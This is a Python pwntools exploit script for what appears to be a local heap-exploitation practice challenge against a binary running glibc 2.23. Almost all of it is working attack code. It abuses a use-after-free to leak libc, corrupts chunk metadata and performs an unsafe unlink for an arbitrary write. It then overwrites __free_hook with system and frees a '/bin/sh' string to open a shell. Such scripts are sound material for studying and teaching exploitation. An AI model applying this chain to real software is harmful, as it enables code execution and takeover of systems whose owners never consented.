'''
Unsafe unlink challenge :) 
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.magic_value'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.23/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(size_type, string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(size_type))
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil("Welcome").replace("Welcome","") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", str(string)) 
	return 

def trigger_bug():
	###########################
	# SETUP ###################
	###########################
	''' 
	Instead of setting the ptr to zero in the lst, it just 
	decrements the counter for the size. 

	So, if we free a 'string' that is not at the top of the list
	there is a 'use after free' that is created. 

	We allocate two 'strings' and free index 0. Now, there is a
	UAF on the 0th index. 
	
	The first size needs to be LARGE for an overwrite later. 
	'''
	create_string('l', "ONE")   # Index 0 
	create_string('l', "TWO")   # Index 1 
	create_string('l', "THREE") # Index 2
	create_string('l', "FOUR")  # Index 3

	##########################
	#### Trigger #############
	##########################
	# Free index 3 AND 0 -- This creates a use after free on the malloc chunk at index 1. 
	'''
	This chunks goes into the unsorted bin because of the size. 
	The chunk directly above (index 1) is important because if 
	this chunk was not there, then the chunk would be next to the 
	top chunk as free. 

	Unsorted bin chunks which are adjacent to the top chunk are 
	unlinked and added to the top chunk.
	''' 
	delete_string(0) 
	delete_string(1) 
	return 0 

def libc_leak(): 
	'''
	From the previous step, there is a UAF on an unsorted_bin chunk
	at index 0. 
	This allows us to get a LEAK to LibC (only item in the bin. So,
	both pointers point to LibC). 

	Use the offset to get the base of libc! 
	'''
	offset = 0x39fb78
	leak = view_string(0)[1:8] + "\x00"
	leak = u64(leak) # Unpack the string to convert it to an integer
	print("LibC Leak: ", hex(leak))
	
	libc_base = leak - offset
	print("LibC Base: ", hex(libc_base))
	libc.address = libc_base
	return libc_base

def corrupt_metadata(): 
	'''
	Corrupt size of an unsorted_bin size chunk
	'''
	create_string('s', 'FILLER') # Create a string index 2

	create_string('l', 'CHUNK') # Index 3

	corrupted_chunk = "A" * 0x90 # Filler prior to chunk 
	corrupted_chunk += p64(0xa0 - 0x10)  # prev_size
	corrupted_chunk += p64(0xc0) # size. Remove the prev_inuse bit

	# Corrupt unsorted bin chunk (last remainder) 
	edit_string(0, corrupted_chunk) # Overlap 0 and 2. Overwrite chunk of index 3

def trigger_unlink():	
	'''
	At this point, the metadata of a chunk is corrupted, allowing
	for an improper consolidation.
	'''
	fake_chunk = p64(0x0) * 2 # size and prev_size
	fake_chunk += p64(0x6020c0 - 0x18) + p64(0x6020c0 - 0x10) # Bypass FD->bk = P and BK->fd = P

	# Overwrite heap fd and bk chunks 
	edit_string(0, fake_chunk) 

	# Unsafe unlink!	
	# Sets the unlinked chunk (index 0) to storage location - 0x20
	delete_string(3) 


def write_pointer(libc_base): 
	'''
	Index 0 has a pointer to 'strings' - 0x18
	Write here in order to get an arbitrary write! :) 
	'''
	
	stdout_offset = 0x39f8e0

	# The repairs does not work every time... need to find out why.
	payload = p64(0x0) # Repair part of STDIN
	payload += p64(libc_base + stdout_offset) + p64(0x0) # Pair STDOUT
	payload += p64(libc.symbols['__free_hook']) # Index 0 NOW points to _free_hook
	
	# Create a write primitve
	edit_string(0, payload) 

def code_exec():
	'''
	Index 0 has a pointer to __free_hook 
	Write to this the address of system :) 
	'''
	edit_string(0, p64(libc.symbols['system']))	
	
	create_string('s', '/bin/sh') # Use as the proper call to system. index 3
	delete_string(3) # POp shell!
	

# Location of the magic value in memory

# Trigger the vulnerability. 
# Creates a UAF on index.
UAF_index = trigger_bug()

libc_base = libc_leak()

corrupt_metadata()
trigger_unlink()
write_pointer(libc_base) 
code_exec()

p.interactive()


